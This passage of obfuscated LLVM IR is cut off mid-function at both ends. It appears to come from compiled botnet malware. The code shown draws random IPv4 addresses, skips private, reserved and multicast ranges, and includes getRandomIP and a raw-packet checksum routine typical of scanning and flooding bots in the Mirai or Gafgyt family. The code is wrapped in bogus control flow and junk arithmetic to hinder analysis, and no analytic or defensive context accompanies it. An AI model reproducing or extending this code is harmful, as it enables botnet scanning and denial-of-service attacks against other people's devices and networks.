  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %55 = call i32 @inet_addr(i8* %54) #2
  store i32 %55, i32* %1, align 4
  br label %389

; <label>:56:                                     ; preds = %originalBBpart2, %11, %7, %0
  %57 = call i32 @rand() #2
  %58 = srem i32 %57, 255
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %60 = call i32 @rand() #2
  %61 = srem i32 %60, 255
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %63 = call i32 @rand() #2
  %64 = srem i32 %63, 255
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %66 = call i32 @rand() #2
  %67 = srem i32 %66, 255
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart279, %56
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %345, label %73

; <label>:73:                                     ; preds = %69
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 10
  br i1 %76, label %345, label %77

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 100
  br i1 %80, label %81, label %89

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp sge i32 %83, 64
  br i1 %84, label %85, label %89

; <label>:85:                                     ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp sle i32 %87, 127
  br i1 %88, label %345, label %89

; <label>:89:                                     ; preds = %85, %81, %77
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 127
  br i1 %92, label %345, label %93

; <label>:93:                                     ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 169
  br i1 %96, label %97, label %101

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 254
  br i1 %100, label %345, label %101

; <label>:101:                                    ; preds = %97, %93
  %102 = load i32, i32* @x.51
  %103 = load i32, i32* @y.52
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %101
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 172
  %113 = load i32, i32* @x.51
  %114 = load i32, i32* @y.52
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %112, label %121, label %161

; <label>:121:                                    ; preds = %originalBBpart24
  %122 = load i32, i32* @x.51
  %123 = load i32, i32* @y.52
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %121
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sle i32 %131, 16
  %133 = load i32, i32* @x.51
  %134 = load i32, i32* @y.52
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %132, label %141, label %161

; <label>:141:                                    ; preds = %originalBBpart28
  %142 = load i32, i32* @x.51
  %143 = load i32, i32* @y.52
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %141
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp sle i32 %151, 31
  %153 = load i32, i32* @x.51
  %154 = load i32, i32* @y.52
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %152, label %345, label %161

; <label>:161:                                    ; preds = %originalBBpart212, %originalBBpart28, %originalBBpart24
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 192
  br i1 %164, label %165, label %173

; <label>:165:                                    ; preds = %161
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %173

; <label>:169:                                    ; preds = %165
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 2
  br i1 %172, label %345, label %173

; <label>:173:                                    ; preds = %169, %165, %161
  %174 = load i32, i32* @x.51
  %175 = load i32, i32* @y.52
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %173
  %182 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 192
  %185 = load i32, i32* @x.51
  %186 = load i32, i32* @y.52
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %184, label %193, label %201

; <label>:193:                                    ; preds = %originalBBpart216
  %194 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 88
  br i1 %196, label %197, label %201

; <label>:197:                                    ; preds = %193
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 99
  br i1 %200, label %345, label %201

; <label>:201:                                    ; preds = %197, %193, %originalBBpart216
  %202 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 192
  br i1 %204, label %205, label %225

; <label>:205:                                    ; preds = %201
  %206 = load i32, i32* @x.51
  %207 = load i32, i32* @y.52
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %205
  %214 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 168
  %217 = load i32, i32* @x.51
  %218 = load i32, i32* @y.52
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %216, label %345, label %225

; <label>:225:                                    ; preds = %originalBBpart220, %201
  %226 = load i32, i32* @x.51
  %227 = load i32, i32* @y.52
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %225
  %234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 198
  %237 = load i32, i32* @x.51
  %238 = load i32, i32* @y.52
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %236, label %245, label %269

; <label>:245:                                    ; preds = %originalBBpart224
  %246 = load i32, i32* @x.51
  %247 = load i32, i32* @y.52
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %245
  %254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 18
  %257 = load i32, i32* @x.51
  %258 = load i32, i32* @y.52
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %256, label %345, label %265

; <label>:265:                                    ; preds = %originalBBpart228
  %266 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %267 = zext i8 %266 to i32
  %268 = icmp eq i32 %267, 19
  br i1 %268, label %345, label %269

; <label>:269:                                    ; preds = %265, %originalBBpart224
  %270 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 198
  br i1 %272, label %273, label %281

; <label>:273:                                    ; preds = %269
  %274 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 51
  br i1 %276, label %277, label %281

; <label>:277:                                    ; preds = %273
  %278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %279 = zext i8 %278 to i32
  %280 = icmp eq i32 %279, 100
  br i1 %280, label %345, label %281

; <label>:281:                                    ; preds = %277, %273, %269
  %282 = load i32, i32* @x.51
  %283 = load i32, i32* @y.52
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %281
  %290 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 203
  %293 = load i32, i32* @x.51
  %294 = load i32, i32* @y.52
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %292, label %301, label %325

; <label>:301:                                    ; preds = %originalBBpart232
  %302 = load i32, i32* @x.51
  %303 = load i32, i32* @y.52
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %301
  %310 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %311 = zext i8 %310 to i32
  %312 = icmp eq i32 %311, 0
  %313 = load i32, i32* @x.51
  %314 = load i32, i32* @y.52
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %312, label %321, label %325

; <label>:321:                                    ; preds = %originalBBpart236
  %322 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %323 = zext i8 %322 to i32
  %324 = icmp eq i32 %323, 113
  br i1 %324, label %345, label %325

; <label>:325:                                    ; preds = %321, %originalBBpart236, %originalBBpart232
  %326 = load i32, i32* @x.51
  %327 = load i32, i32* @y.52
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %325
  %334 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %335 = zext i8 %334 to i32
  %336 = icmp sge i32 %335, 224
  %337 = load i32, i32* @x.51
  %338 = load i32, i32* @y.52
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %345

; <label>:345:                                    ; preds = %originalBBpart240, %321, %277, %265, %originalBBpart228, %originalBBpart220, %197, %169, %originalBBpart212, %97, %89, %85, %73, %69
  %346 = phi i1 [ true, %321 ], [ true, %277 ], [ true, %265 ], [ true, %originalBBpart228 ], [ true, %originalBBpart220 ], [ true, %197 ], [ true, %169 ], [ true, %originalBBpart212 ], [ true, %97 ], [ true, %89 ], [ true, %85 ], [ true, %73 ], [ true, %69 ], [ %336, %originalBBpart240 ]
  br i1 %346, label %347, label %376

; <label>:347:                                    ; preds = %345
  %348 = load i32, i32* @x.51
  %349 = load i32, i32* @y.52
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %347
  %356 = call i32 @rand() #2
  %357 = srem i32 %356, 255
  %358 = trunc i32 %357 to i8
  store i8 %358, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %359 = call i32 @rand() #2
  %360 = srem i32 %359, 255
  %361 = trunc i32 %360 to i8
  store i8 %361, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %362 = call i32 @rand() #2
  %363 = srem i32 %362, 255
  %364 = trunc i32 %363 to i8
  store i8 %364, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %365 = call i32 @rand() #2
  %366 = srem i32 %365, 255
  %367 = trunc i32 %366 to i8
  store i8 %367, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %368 = load i32, i32* @x.51
  %369 = load i32, i32* @y.52
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart279, label %originalBB42alteredBB

originalBBpart279:                                ; preds = %originalBB42
  br label %69

; <label>:376:                                    ; preds = %345
  %377 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %378 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %379 = zext i8 %378 to i32
  %380 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %381 = zext i8 %380 to i32
  %382 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %383 = zext i8 %382 to i32
  %384 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %385 = zext i8 %384 to i32
  %386 = call i32 (i8*, i8*, ...) @szprintf(i8* %377, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %379, i32 %381, i32 %383, i32 %385)
  %387 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %388 = call i32 @inet_addr(i8* %387) #2
  store i32 %388, i32* %1, align 4
  br label %389

; <label>:389:                                    ; preds = %376, %35
  %390 = load i32, i32* @x.51
  %391 = load i32, i32* @y.52
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %389
  %398 = load i32, i32* %1, align 4
  %399 = load i32, i32* @x.51
  %400 = load i32, i32* @y.52
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  ret i32 %398

originalBBalteredBB:                              ; preds = %originalBB, %15
  %407 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %408 = zext i8 %407 to i32
  %409 = icmp slt i32 %408, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %101
  %410 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %411 = zext i8 %410 to i32
  %412 = icmp eq i32 %411, 172
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %121
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp sle i32 %414, 16
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %141
  %416 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %417 = zext i8 %416 to i32
  %418 = icmp sle i32 %417, 31
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %173
  %419 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 192
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %205
  %422 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %423 = zext i8 %422 to i32
  %424 = icmp eq i32 %423, 168
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %225
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 198
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %245
  %428 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 18
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %281
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %432 = zext i8 %431 to i32
  %433 = icmp eq i32 %432, 203
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %301
  %434 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %435 = zext i8 %434 to i32
  %436 = icmp eq i32 %435, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %325
  %437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %438 = zext i8 %437 to i32
  %439 = icmp sge i32 %438, 224
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %347
  %440 = call i32 @rand() #2
  %_ = shl i32 %440, 255
  %_43 = sub i32 %440, 255
  %gen = mul i32 %_43, 255
  %_44 = sub i32 0, %440
  %gen45 = add i32 %_44, 255
  %_46 = sub i32 %440, 255
  %gen47 = mul i32 %_46, 255
  %_48 = shl i32 %440, 255
  %441 = srem i32 %440, 255
  %442 = trunc i32 %441 to i8
  store i8 %442, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %443 = call i32 @rand() #2
  %_49 = sub i32 %443, 255
  %gen50 = mul i32 %_49, 255
  %_51 = shl i32 %443, 255
  %_52 = shl i32 %443, 255
  %_53 = sub i32 %443, 255
  %gen54 = mul i32 %_53, 255
  %_55 = sub i32 0, %443
  %gen56 = add i32 %_55, 255
  %_57 = shl i32 %443, 255
  %444 = srem i32 %443, 255
  %445 = trunc i32 %444 to i8
  store i8 %445, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %446 = call i32 @rand() #2
  %_58 = sub i32 %446, 255
  %gen59 = mul i32 %_58, 255
  %_60 = sub i32 0, %446
  %gen61 = add i32 %_60, 255
  %447 = srem i32 %446, 255
  %448 = trunc i32 %447 to i8
  store i8 %448, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %449 = call i32 @rand() #2
  %_62 = sub i32 %449, 255
  %gen63 = mul i32 %_62, 255
  %_64 = sub i32 0, %449
  %gen65 = add i32 %_64, 255
  %_66 = sub i32 0, %449
  %gen67 = add i32 %_66, 255
  %_68 = sub i32 0, %449
  %gen69 = add i32 %_68, 255
  %_70 = sub i32 0, %449
  %gen71 = add i32 %_70, 255
  %_72 = sub i32 %449, 255
  %gen73 = mul i32 %_72, 255
  %_74 = sub i32 %449, 255
  %gen75 = mul i32 %_74, 255
  %_76 = sub i32 0, %449
  %gen77 = add i32 %_76, 255
  %450 = srem i32 %449, 255
  %451 = trunc i32 %450 to i8
  store i8 %451, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %originalBB42

originalBB81alteredBB:                            ; preds = %originalBB81, %389
  %452 = load i32, i32* %1, align 4
  br label %originalBB81
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #13
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.53
  %23 = load i32, i32* @y.54
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #13
  %34 = load i32, i32* %30, align 4
  %_ = sub i32 0, %33
  %gen = add i32 %_, %34
  %_1 = sub i32 0, %33
  %gen2 = add i32 %_1, %34
  %_3 = sub i32 0, %33
  %gen4 = add i32 %_3, %34
  %_5 = shl i32 %33, %34
  %_6 = shl i32 %33, %34
  %_7 = shl i32 %33, %34
  %_8 = sub i32 %33, %34
  %gen9 = mul i32 %_8, %34
  %_10 = sub i32 0, %33
  %gen11 = add i32 %_10, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_12 = sub i32 0, %38
  %gen13 = add i32 %_12, -1
  %39 = xor i32 %38, -1
  %_14 = sub i32 %37, %39
  %gen15 = mul i32 %_14, %39
  %_16 = sub i32 %37, %39
  %gen17 = mul i32 %_16, %39
  %_18 = sub i32 %37, %39
  %gen19 = mul i32 %_18, %39
  %_20 = sub i32 0, %37
  %gen21 = add i32 %_20, %39
  %40 = and i32 %37, %39
  %_22 = sub i32 %36, %40
  %gen23 = mul i32 %_22, %40
  %_24 = sub i32 %36, %40
  %gen25 = mul i32 %_24, %40
  %_26 = shl i32 %36, %40
  %_27 = sub i32 0, %36
  %gen28 = add i32 %_27, %40
  %_29 = sub i32 %36, %40
  %gen30 = mul i32 %_29, %40
  %_31 = sub i32 0, %36
  %gen32 = add i32 %_31, %40
  %_33 = sub i32 %36, %40
  %gen34 = mul i32 %_33, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
